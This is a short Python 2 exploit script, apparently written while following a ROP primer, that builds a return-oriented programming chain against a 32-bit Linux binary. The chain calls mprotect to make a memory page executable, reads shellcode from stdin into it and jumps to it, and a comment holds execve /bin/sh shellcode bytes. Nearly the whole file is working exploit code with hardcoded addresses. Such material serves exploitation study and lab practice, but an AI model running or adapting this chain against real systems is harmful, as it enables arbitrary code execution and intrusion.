#!/usr/bin/python

# following along here
# https://speakerd.s3.amazonaws.com/presentations/6486b353d27b45038d6b4286acbc9390/rop-primer.pdf

''' shellcode
\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
'''

'''
You're going to need to change the addrs of the functions for the ROP chain
'''

import struct
def p(x):
    return struct.pack('<L', x)

payload = ""
payload += p(0x80483e8)
payload += "A"*12 # dummy

# make memory section rwx
# int mprotect(void *addr, size_t len, int prot);
payload += p(0xf7efc0d0) # mprotect()
payload += p(0x804855d) # pppr (pop3ret)
payload += p(0x20000000) # mprotect argv[0] - addr to make executable
payload += p(0x1000) # mprotect argv [1] page-aligned size
payload += p(0x7) # mprotect argv [2] PROT|READ|PROT|WRITE|PROT_EXEC

# read shellcode into buffer
# ssize_t read(int fd, void *buf, size_t count);
payload += p(0xf7eefbd0) # read@plt
payload += p(0x804855d) # pppr
payload += p(0x0) # fd = STDIN
payload += p(0x20000000) #buf
payload += p(0x200) # len

# return to buffer with shellcode, exec it
payload += p(0x20000000) # mprotect argv[0] - addr to make executable

print payload
